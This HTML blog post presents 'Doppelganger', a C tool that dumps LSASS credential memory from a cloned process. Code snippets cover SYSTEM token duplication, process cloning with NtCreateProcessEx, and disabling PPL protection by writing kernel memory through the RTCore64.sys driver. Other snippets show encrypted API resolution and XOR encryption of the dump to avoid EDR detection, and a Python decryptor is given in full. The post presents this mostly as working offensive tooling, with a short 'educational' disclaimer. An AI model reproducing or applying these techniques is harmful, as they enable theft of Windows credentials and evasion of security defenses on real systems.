<!DOCTYPE html>


<html lang="en-us" data-theme="">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
        
<meta charset="utf-8">
<meta name="HandheldFriendly" content="True">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer-when-downgrade">

<title>Doppelganger - Vari-sh&rsquo;s Blog</title>

<meta name="description" content="## Doppelganger Program: An Advanced LSASS Dumper with Process Cloning ### Author: vari.sh # Overview The Doppelganger Program is an advanced Windows utility designed to obtain an LSASS (Local Security Authority Subsystem Service) dump from a cloned process, rather than the original one. By using process cloning techniques, the tool aims to bypass PPL (Process Protected Light), VBS (Virtualization Based Security), EDR/XDR detection mechanisms that typically monitor interactions with lsass.">





<link rel="icon" type="image/x-icon" href="http://localhost:1313/favicon.ico">
<link rel="apple-touch-icon-precomposed" href="http://localhost:1313/favicon.png">








    



<style>
  body {
    visibility: hidden;
    opacity: 0;
  }
</style>

<noscript>
  <style>
    body {
      visibility: visible;
      opacity: 1;
    }
  </style>
</noscript>




    





    
    
    

    
        <link rel="stylesheet" href="/css/style.4c42aa0abeac804c4933c54677c449cea1f723caae778425d031e98565a0cdef.css" integrity="sha256-TEKqCr6sgExJM8VGd8RJzqH3I8qud4Ql0DHphWWgze8=">
    





    





    
    
    

    
        <link rel="stylesheet" href="/css/style.9c1888ebff42c0224ce04dac10cb2c401f1b77f54f78e8d87d73c3bed781c263.css" integrity="sha256-nBiI6/9CwCJM4E2sEMssQB8bd/VPeOjYfXPDvteBwmM=">
    





    





    
    
    

    
        <link rel="stylesheet" href="/css/style.acd606c0fce58853afe0248d37bb41acbbcdd8b1aca2412b6c0fa760da0137f3.css" integrity="sha256-rNYGwPzliFOv4CSNN7tBrLvN2LGsokErbA&#43;nYNoBN/M=">
    












    

    





    
    
    

    
        <script src="/js/script.672e2309c296e07c18bcd08b28d797a56222ff941d65f308fba3158c44885b14.js" type="text/javascript" charset="utf-8" integrity="sha256-Zy4jCcKW4HwYvNCLKNeXpWIi/5QdZfMI&#43;6MVjESIWxQ="></script>
    



















    
</head>
<body>
    <a class="skip-main" href="#main">Skip to main content</a>
    <div class="container">
        <header class="common-header">
            
                <div class="header-top">
    <div class="header-top-left">
        <h1 class="site-title noselect">
    <a href="/">Vari-sh&#39;s Blog</a>
</h1>

        







    
        <div class="theme-switcher">
            <span class="inline-svg">

    


    
    
    
    
    

    <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-sun-high"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" /><path d="M6.343 17.657l-1.414 1.414" /><path d="M6.343 6.343l-1.414 -1.414" /><path d="M17.657 6.343l1.414 -1.414" /><path d="M17.657 17.657l1.414 1.414" /><path d="M4 12h-2" /><path d="M12 4v-2" /><path d="M20 12h2" /><path d="M12 20v2" /></svg>


</span>

        </div>
    

    <script>
        const STORAGE_KEY = 'user-color-scheme'
        const defaultTheme = "light"

        let currentTheme
        let switchButton
        let autoDefinedScheme = window.matchMedia('(prefers-color-scheme: dark)')

        function switchTheme(e) {
            currentTheme = (currentTheme === 'dark') ? 'light' : 'dark';
            if (localStorage) localStorage.setItem(STORAGE_KEY, currentTheme);
            document.documentElement.setAttribute('data-theme', currentTheme);
            changeGiscusTheme(currentTheme);
            document.body.dispatchEvent(new CustomEvent(currentTheme + "-theme-set"));
        }

        const autoChangeScheme = e => {
            currentTheme = e.matches ? 'dark' : 'light'
            document.documentElement.setAttribute('data-theme', currentTheme);
            changeGiscusTheme(currentTheme);
            document.body.dispatchEvent(new CustomEvent(currentTheme + "-theme-set"));
        }

        document.addEventListener('DOMContentLoaded', function () {
            switchButton = document.querySelector('.theme-switcher')
            currentTheme = detectCurrentScheme()

            if (currentTheme === 'auto') {
                autoChangeScheme(autoDefinedScheme);
                autoDefinedScheme.addListener(autoChangeScheme);
            } else {
                document.documentElement.setAttribute('data-theme', currentTheme)
            }

            if (switchButton) {
                switchButton.addEventListener('click', switchTheme, false)
            }

            showContent();
        })

        function detectCurrentScheme() {
            if (localStorage !== null && localStorage.getItem(STORAGE_KEY)) {
                return localStorage.getItem(STORAGE_KEY)
            }
            if (defaultTheme) {
                return defaultTheme
            }
            return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
        }

        function showContent() {
            document.body.style.visibility = 'visible';
            document.body.style.opacity = 1;
        }

        function changeGiscusTheme (theme) {
            function sendMessage(message) {
              const iframe = document.querySelector('iframe.giscus-frame');
              if (!iframe) return;
              iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
            }

            sendMessage({
              setConfig: {
                theme: theme
              }
            });
        }
    </script>


        <ul class="social-icons noselect">


    
        <li>
            <a href="https://github.com/vari-sh" title="Github" rel="me">
            <span class="inline-svg">

    


    
    
    
    
    

    <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-github"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" /></svg>


</span>

            </a>
        </li>
    






    <li>
            <a href="/index.xml" title="RSS" rel="me">
            <span class="inline-svg">

    


    
    
    
    
    

    <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-rss"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0" /><path d="M4 4a16 16 0 0 1 16 16" /><path d="M4 11a9 9 0 0 1 9 9" /></svg>


</span>

            </a>
        </li>
    

</ul>

    </div>
    <div class="header-top-right">

    </div>
</div>


    <nav class="noselect">
        
        
        <a class="" href="http://localhost:1313/" title="">Home</a>
        
        <a class="" href="http://localhost:1313/posts/" title="">Archive</a>
        
        <a class="" href="http://localhost:1313/about/" title="">About</a>
        
    </nav>








            
        </header>
        <main id="main" tabindex="-1">
            
    

    <article class="post h-entry">
        <div class="post-header">
            <header>
                <h1 class="p-name post-title">Doppelganger</h1>
                

            </header>
            



<div class="post-info noselect">
    
        <div class="post-date dt-published">
            <time datetime="2025-04-02">2025-04-02</time>
            
        </div>
    

    <a class="post-hidden-url u-url" href="/posts/doppelganger/">/posts/doppelganger/</a>
    <a href="http://localhost:1313/" class="p-name p-author post-hidden-author h-card" rel="me">map[name:vari-sh]</a>


    <div class="post-taxonomies">
        
        
        
    </div>
</div>

        </div>
        

  
  




  
  
  
  <details class="toc noselect">
    <summary>Table of Contents</summary>
    <div class="inner"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#doppelganger-program-an-advanced-lsass-dumper-with-process-cloning">Doppelganger Program: An Advanced LSASS Dumper with Process Cloning</a></li>
      </ul>
    </li>
    <li><a href="#overview">Overview</a></li>
    <li><a href="#features">Features</a></li>
    <li><a href="#installation">Installation</a>
      <ul>
        <li><a href="#compilation">Compilation</a></li>
      </ul>
    </li>
    <li><a href="#code-breakdown">Code Breakdown</a>
      <ul>
        <li><a href="#1-resolving-apis">1. Resolving APIs</a></li>
        <li><a href="#2-token-duplication">2. Token Duplication</a></li>
        <li><a href="#3-process-cloning">3. Process Cloning</a></li>
        <li><a href="#4-disabling-ppl">4. Disabling PPL</a></li>
        <li><a href="#5-creating-the-dump">5. Creating the Dump</a></li>
      </ul>
    </li>
    <li><a href="#decryption">Decryption</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#disclaimer">Disclaimer</a></li>
  </ul>
</nav></div>
  </details>
  



<script>
  var toc = document.querySelector(".toc");
  if (toc) {
    toc.addEventListener("click", function () {
      if (event.target.tagName !== "A") {
        event.preventDefault();
        if (this.open) {
          this.open = false;
          this.classList.remove("expanded");
        } else {
          this.open = true;
          this.classList.add("expanded");
        }
      }
    });
  }
</script>

        <div class="content e-content">
            <h3 id="doppelganger-program-an-advanced-lsass-dumper-with-process-cloning" >
<div>
    <a href="#doppelganger-program-an-advanced-lsass-dumper-with-process-cloning">
        ##
    </a>
    Doppelganger Program: An Advanced LSASS Dumper with Process Cloning
</div>
</h3>
<h4 id="author-varish" >
<div>
    <a href="#author-varish">
        ###
    </a>
    Author: vari.sh
</div>
</h4>
<hr>
<p><img src="/images/doppelganger.png" alt="Doppelganger"></p>
<h2 id="overview" >
<div>
    <a href="#overview">
        #
    </a>
    Overview
</div>
</h2>
<p>The <strong>Doppelganger Program</strong> is an advanced Windows utility designed to obtain an LSASS (Local Security Authority Subsystem Service) dump from a cloned process, rather than the original one. By using process cloning techniques, the tool aims to bypass PPL (Process Protected Light), VBS (Virtualization Based Security), EDR/XDR detection mechanisms that typically monitor interactions with <code>lsass.exe</code>.</p>
<p>The program achieves this by:</p>
<ul>
<li>Obtaining a SYSTEM token through token duplication.</li>
<li>Loading clean versions of Windows DLLs to avoid detection.</li>
<li>Cloning the LSASS process using <code>NtCreateProcessEx</code>.</li>
<li>Disabling PPL (Protected Process Light) protection on <code>lsass.exe</code>.</li>
<li>Creating an LSASS dump using <code>MiniDumpWriteDump()</code>.</li>
<li>Encrypting the dump file using XOR encryption to further avoid detection.</li>
</ul>
<hr>
<h2 id="features" >
<div>
    <a href="#features">
        #
    </a>
    Features
</div>
</h2>
<ul>
<li><strong>Process Cloning:</strong> Uses <code>NtCreateProcessEx</code> to clone <code>lsass.exe</code> and avoid detection.</li>
<li><strong>XOR Encryption:</strong> Dumps are encrypted with a predefined XOR key before being written to disk.</li>
<li><strong>Driver Interaction:</strong> Leverages <code>RTCore64.sys</code> for direct memory access to disable PPL.</li>
<li><strong>Token Manipulation:</strong> Elevates to SYSTEM privileges to access LSASS.</li>
<li><strong>DLL Offuscation:</strong> Loads DLLs using encrypted strings to bypass signature-based detections.</li>
</ul>
<hr>
<h2 id="installation" >
<div>
    <a href="#installation">
        #
    </a>
    Installation
</div>
</h2>
<p>The Doppelganger Program is written in C and is intended to be compiled using Visual Studio. The repository is structured as follows:</p>
<pre tabindex="0"><code>doppelganger/
│
├── includes/          # Header files (.h)
├── src/               # Source files (.c)
├── build/             # Output binaries
├── utils/             # Utility scripts (e.g., decryptor)
└── README.md          # Documentation
</code></pre><h3 id="compilation" >
<div>
    <a href="#compilation">
        ##
    </a>
    Compilation
</div>
</h3>
<p>Compile the project in Visual Studio using the provided solution file.
Ensure to have the <code>RTCore64.sys</code> driver present and accessible by the program.</p>
<hr>
<h2 id="code-breakdown" >
<div>
    <a href="#code-breakdown">
        #
    </a>
    Code Breakdown
</div>
</h2>
<h3 id="1-resolving-apis" >
<div>
    <a href="#1-resolving-apis">
        ##
    </a>
    1. Resolving APIs
</div>
</h3>
<p>The tool resolves critical Windows APIs by decrypting their names from encrypted strings and dynamically loading them with <code>CustomGetProcAddress()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#78787e">// Example of resolving API pointers
</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span>BOOL success <span style="color:#ff6ac1">=</span>
</span></span><span style="display:flex;"><span>    <span style="color:#57c7ff">ResolveApiFromDll</span>(hKernel32, P32F_ENC, <span style="color:#ff6ac1">sizeof</span>(P32F_ENC), (<span style="color:#9aedfe">void</span><span style="color:#ff6ac1">**</span>)<span style="color:#ff6ac1">&amp;</span>pP32F) <span style="color:#ff6ac1">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#57c7ff">ResolveApiFromDll</span>(hNtdll, NTCPE_ENC, <span style="color:#ff6ac1">sizeof</span>(NTCPE_ENC), (<span style="color:#9aedfe">void</span><span style="color:#ff6ac1">**</span>)<span style="color:#ff6ac1">&amp;</span>pNTCPX) <span style="color:#ff6ac1">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#57c7ff">ResolveApiFromDll</span>(hAdvapi32, OPTK_ENC, <span style="color:#ff6ac1">sizeof</span>(OPTK_ENC), (<span style="color:#9aedfe">void</span><span style="color:#ff6ac1">**</span>)<span style="color:#ff6ac1">&amp;</span>pOPTK);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> (<span style="color:#ff6ac1">!</span>success) {
</span></span><span style="display:flex;"><span>    <span style="color:#57c7ff">log_error</span>(<span style="color:#5af78e">&#34;Failed to resolve one or more APIs.&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> FALSE;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="2-token-duplication" >
<div>
    <a href="#2-token-duplication">
        ##
    </a>
    2. Token Duplication
</div>
</h3>
<p>To interact with <code>lsass.exe</code>, the tool impersonates SYSTEM using duplicated tokens.</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE hSystemToken <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">NULL</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> (<span style="color:#ff6ac1">!</span><span style="color:#57c7ff">GetSystemTokenAndDuplicate</span>(<span style="color:#ff6ac1">&amp;</span>hSystemToken)) {
</span></span><span style="display:flex;"><span>    <span style="color:#57c7ff">log_error</span>(<span style="color:#5af78e">&#34;Failed to duplicate SYSTEM token.&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff9f43">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="3-process-cloning" >
<div>
    <a href="#3-process-cloning">
        ##
    </a>
    3. Process Cloning
</div>
</h3>
<p>Using <code>NtCreateProcessEx</code>, the tool creates a clone of <code>lsass.exe</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>NTSTATUS status <span style="color:#ff6ac1">=</span> <span style="color:#57c7ff">pNTCPX</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">&amp;</span>hClone,
</span></span><span style="display:flex;"><span>    PROCESS_ALL_ACCESS,
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">&amp;</span>objAttr,
</span></span><span style="display:flex;"><span>    hLsass,
</span></span><span style="display:flex;"><span>    <span style="color:#ff9f43">0</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">NULL</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">NULL</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">NULL</span>,
</span></span><span style="display:flex;"><span>    FALSE
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><h3 id="4-disabling-ppl" >
<div>
    <a href="#4-disabling-ppl">
        ##
    </a>
    4. Disabling PPL
</div>
</h3>
<p>Protected Process Light (PPL) protection is disabled by directly modifying memory using the <code>RTCore64.sys</code> driver.</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#57c7ff">WriteMemoryPrimitive</span>(Device, <span style="color:#ff9f43">1</span>, eproc <span style="color:#ff6ac1">+</span> offs.Protection <span style="color:#ff6ac1">-</span> <span style="color:#ff9f43">2</span>, <span style="color:#ff9f43">0x00</span>); <span style="color:#78787e">// SignatureLevel
</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span><span style="color:#57c7ff">WriteMemoryPrimitive</span>(Device, <span style="color:#ff9f43">1</span>, eproc <span style="color:#ff6ac1">+</span> offs.Protection <span style="color:#ff6ac1">-</span> <span style="color:#ff9f43">1</span>, <span style="color:#ff9f43">0x00</span>); <span style="color:#78787e">// SectionSignatureLevel
</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span><span style="color:#57c7ff">WriteMemoryPrimitive</span>(Device, <span style="color:#ff9f43">1</span>, eproc <span style="color:#ff6ac1">+</span> offs.Protection, <span style="color:#ff9f43">0x00</span>); <span style="color:#78787e">// Protection
</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span><span style="color:#57c7ff">log_success</span>(<span style="color:#5af78e">&#34;PPL disabled (0x00 written)&#34;</span>);
</span></span></code></pre></div><p>After the cloning, the values will be restored.</p>
<h3 id="5-creating-the-dump" >
<div>
    <a href="#5-creating-the-dump">
        ##
    </a>
    5. Creating the Dump
</div>
</h3>
<p>Finally, a memory dump of the cloned <code>lsass.exe</code> process is created and encrypted.</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL dumped <span style="color:#ff6ac1">=</span> <span style="color:#57c7ff">pMDWD</span>(
</span></span><span style="display:flex;"><span>    hClone,
</span></span><span style="display:flex;"><span>    clonedPID,
</span></span><span style="display:flex;"><span>    hTempFile,
</span></span><span style="display:flex;"><span>    MiniDumpWithFullMemory,
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">NULL</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">NULL</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">NULL</span>
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><hr>
<h2 id="decryption" >
<div>
    <a href="#decryption">
        #
    </a>
    Decryption
</div>
</h2>
<p>A simple Python script is provided to decrypt the dumped files.</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>XOR_KEY <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;0123456789abcdefghij&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">xor_decrypt</span>(data: <span style="color:#ff5c57">bytes</span>, key: <span style="color:#ff5c57">bytes</span>) <span style="color:#ff6ac1">-&gt;</span> <span style="color:#ff5c57">bytes</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff5c57">bytes</span>([b <span style="color:#ff6ac1">^</span> key[i <span style="color:#ff6ac1">%</span> <span style="color:#ff5c57">len</span>(key)] <span style="color:#ff6ac1">for</span> i, b <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">enumerate</span>(data)])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">main</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> <span style="color:#ff5c57">len</span>(sys<span style="color:#ff6ac1">.</span>argv) <span style="color:#ff6ac1">!=</span> <span style="color:#ff9f43">2</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Usage: </span><span style="color:#5af78e">{</span>sys<span style="color:#ff6ac1">.</span>argv[<span style="color:#ff9f43">0</span>]<span style="color:#5af78e">}</span><span style="color:#5af78e"> &lt;xor_dump_path&gt;&#34;</span>)
</span></span><span style="display:flex;"><span>        sys<span style="color:#ff6ac1">.</span>exit(<span style="color:#ff9f43">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    encrypted_path <span style="color:#ff6ac1">=</span> sys<span style="color:#ff6ac1">.</span>argv[<span style="color:#ff9f43">1</span>]
</span></span><span style="display:flex;"><span>    output_path <span style="color:#ff6ac1">=</span> encrypted_path <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#34;.dec&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">with</span> <span style="color:#ff5c57">open</span>(encrypted_path, <span style="color:#5af78e">&#34;rb&#34;</span>) <span style="color:#ff6ac1">as</span> f:
</span></span><span style="display:flex;"><span>        data <span style="color:#ff6ac1">=</span> f<span style="color:#ff6ac1">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    decrypted <span style="color:#ff6ac1">=</span> xor_decrypt(data, XOR_KEY)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">with</span> <span style="color:#ff5c57">open</span>(output_path, <span style="color:#5af78e">&#34;wb&#34;</span>) <span style="color:#ff6ac1">as</span> f:
</span></span><span style="display:flex;"><span>        f<span style="color:#ff6ac1">.</span>write(decrypted)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Decryption successful. Output written to: </span><span style="color:#5af78e">{</span>output_path<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> __name__ <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><hr>
<h2 id="conclusion" >
<div>
    <a href="#conclusion">
        #
    </a>
    Conclusion
</div>
</h2>
<p>The Doppelganger Program demonstrates how process cloning, API obfuscation, and memory manipulation can be used to bypass traditional detection mechanisms. The combination of techniques makes it effective at retrieving sensitive memory data even on systems protected by anti-tampering mechanisms.</p>
<hr>
<h2 id="disclaimer" >
<div>
    <a href="#disclaimer">
        #
    </a>
    Disclaimer
</div>
</h2>
<p>This project is for educational purposes only. Use responsibly and only in environments where you have explicit permission to test security mechanisms.</p>

        </div>

    </article>

    
    

    
        
        
    

    

    
        









    

    

    

    

        </main>
        
            <footer class="common-footer noselect">
    
    

    <div class="common-footer-bottom">
        

        <div style="display: flex; align-items: center; gap:8px">
            ©  vari-sh,  2025
            
        </div>
        <div style="display:flex;align-items: center">
            
            
            
            
            
            
        </div>
        <div>
            Powered by <a target="_blank" rel="noopener noreferrer" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" rel="noopener noreferrer" href="https://github.com/Junyi-99/hugo-theme-anubis2">Anubis2</a>.<br>
            

        </div>
    </div>

    <p class="h-card vcard">

    <a href=http://localhost:1313/ class="p-name u-url url fn" rel="me">map[name:vari-sh]</a>

    

    
</p>

</footer>

        
    </div>
</body>
</html>
